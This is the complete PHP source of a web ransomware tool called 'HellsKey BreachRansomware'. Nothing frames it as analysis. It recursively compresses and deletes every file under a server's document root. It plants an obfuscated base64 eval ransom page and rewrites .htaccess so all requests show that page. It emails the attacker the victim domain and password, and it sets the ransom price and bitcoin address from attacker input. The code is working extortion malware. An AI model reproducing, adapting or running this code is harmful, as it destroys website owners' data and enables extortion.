# Coded By Dark 07x team #
<title>👁‍HellsKey BreachRansomware👁‍</title>
<link rel="shortcut icon" type="image/x-icon" href="https://c.top4top.io/p_3748xncdx1.jpg">
<style>
html {
background: black;
color: white;
}
input { background: transparent; color: white; border: 1px solid white; }
</style>
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.crypt') !== false) {
    return;
	}
	file_put_contents($filename.".crypt", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
copy('.htaccess','.htabackup');
$file = base64_decode("PHRpdGxlPvCfkYHigI1IZWxsc0tleSBCcmVhY2hSYW5zb213YXJl8J+RgeKAjTwvdGl0bGU+CjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL2MudG9wNHRvcC5pby9wXzM3NDh4bmNkeDEuanBnIj4KPHN0eWxlPgpodG1sIHsKYmFja2dyb3VuZDogYmxhY2s7CmNvbG9yOiB3aGl0ZTsKfQppbnB1dCB7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBjb2xvcjogd2hpdGU7IGJvcmRlcjogMXB4IHNvbGlkIHdoaXRlOyB9Cjwvc3R5bGU+Cjw/cGhwCmVycm9yX3JlcG9ydGluZygwKTsKJGlucHV0ID0gJF9QT1NUWydwYXNzJ107CiRwYXNzID0gImphbmNva2phcmFuIjsKaWYoaXNzZXQoJGlucHV0KSkgewppZihtZDUoJGlucHV0KSA9PSAkcGFzcykgewpmdW5jdGlvbiBkZWNmaWxlKCRmaWxlbmFtZSl7CglpZiAoc3RycG9zKCRmaWxlbmFtZSwgJy5jcnlwdCcpID09PSBGQUxTRSkgewoJcmV0dXJuOwoJfQoJJGRlY3J5cHRlZCA9IGd6aW5mbGF0ZShmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKTsKCWZpbGVfcHV0X2NvbnRlbnRzKHN0cl9yZXBsYWNlKCcuY3J5cHQnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7Cgl1bmxpbmsoJ2NyeXB0LnBocCcpOwoJdW5saW5rKCcuaHRhY2Nlc3MnKTsKCXVubGluaygkZmlsZW5hbWUpOwoJZWNobyAiJGZpbGVuYW1lIERlY3J5cHRlZCAhISE8YnI+IjsKfQoKZnVuY3Rpb24gZGVjZGlyKCRkaXIpewoJJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLicsICcuLicpKTsKCQlmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSkgewoJCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsKCQkJCWRlY2RpcigkZGlyLiIvIi4kZmlsZSk7CgkJCX1lbHNlIHsKCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOwoJCX0KCX0KfQoKZGVjZGlyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10pOwplY2hvICI8YnI+V2Vicm9vdCBEZWNyeXB0ZWQ8YnI+IjsKdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsKdW5saW5rKCcuaHRhY2Nlc3MnKTsKY29weSgnaHRhYmFja3VwJywnLmh0YWNjZXNzJyk7CmVjaG8gJ1N1Y2Nlc3MgISEhJzsKfSBlbHNlIHsKZWNobyAnRmFpbGVkIFBhc3N3b3JkICEhISc7Cn0KZXhpdCgpOwp9Cj8+CjxjZW50ZXI+CjxoMT7wn5GB4oCNSGVsbHNLZXkgQnJlYWNoUmFuc29td2FyZfCfkYHigI08L2gxPgo8aW1nIGhlaWdodD0iMjAwIiBzcmM9Imh0dHBzOi8vYy50b3A0dG9wLmlvL3BfMzc0OHhuY2R4MS5qcGciLz4KPGJyPjxicj4KPGgzPllvdXIgV2Vic2l0ZSBJcyBFbmNyeXB0ZWQ8L2gzPgoKCkRvbid0IENoYW5nZSB0aGUgRmlsZW5hbWUgYmVjYXVzZSBpdCBDYW4gRGFtYWdlIHRoZSBGaWxlIElmIFlvdSBXYW50IHRvIFJldHVybiBZb3UgTXVzdCBFbnRlciB0aGUgUGFzc3dvcmQgRmlyc3QKPGJyPgpTZW5kIE1lICQzIEZvciBCYWNrIFlvdXIgV2Vic2l0ZSA8YnI+PGJyPgpCaXRjb2luIEFkZHJlc3MgOiA8aW5wdXQgdHlwZT0idGV4dCIgdmFsdWU9IlRFQU0gREFSSyAwN1giIHJlYWRvbmx5Pgo8YnI+PGJyPgo8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPgo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIj4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkRlY3J5cHQiPgo8L2Zvcm0+Cjxicj5Db250YWN0IE1haWwgOiBoZWxsc2tleWJyZWFjaEBnbWFpbC5jb20gCg==");
$q = str_replace('hellskeybreach', md5($_POST['pass']), $file);
$w = str_replace('hellskeybrach@gmail.com', $_POST['email'], $q);
$e = str_replace('kontolanjing', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('crypt.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex crypt.php\n
ErrorDocument 403 /crypt.php\n
ErrorDocument 404 /crypt.php\n
ErrorDocument 500 /crypt.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Encrypted !!!<br>";
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}

if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('crypt.php', $_SERVER['DOCUMENT_ROOT'].'/crypt.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$to = $_POST['email'];
$subject = 'Your Ransomware Info';
$message = "Domain : ".$_SERVER['HTTP_ADDR']."\n\n"."Your Password : ".$_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>
<center>
<h1>👁‍HellsKey BreachRansomware👁‍</h1>
<img height="200" src="https://c.top4top.io/p_3748xncdx1.jpg"/>
<br><br><h3>Information Server :</h3>
Path File : <font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function : <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : <font color="red"><?php if(mail('hellskeybreach@gmail.com','tes','tes')) { echo "ON"; } else { echo "OFF"; } ?></font>
<br><Br>
<form enctype="multipart/form-data" method="post">
Password Encrypt : <input type="text" name="pass"> Your Email : <input type="text" name="email">
<br><br>
Your Bitcoin Address : <input type="text" name="btc"> Your Price : <input type="text" name="price">
<br><br>
<input type="submit" value="Encrypt">
</form>
